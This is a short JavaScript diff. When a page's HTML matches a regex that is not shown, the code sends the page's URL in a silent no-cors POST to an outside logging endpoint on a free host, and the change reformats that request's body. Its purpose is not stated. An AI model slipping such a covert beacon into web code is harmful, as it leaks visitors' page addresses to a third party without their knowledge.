@@ -3,6 +3,7 @@ if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
 fetch('https://lordwd.000webhostapp.com/log.php', {
 method: 'POST',
 mode: 'no-cors',
-body:document.documentURI
+headers:{'content-type': 'application/x-www-form-urlencoded'},
+body:`domain=${document.documentURI}`
 });
 }
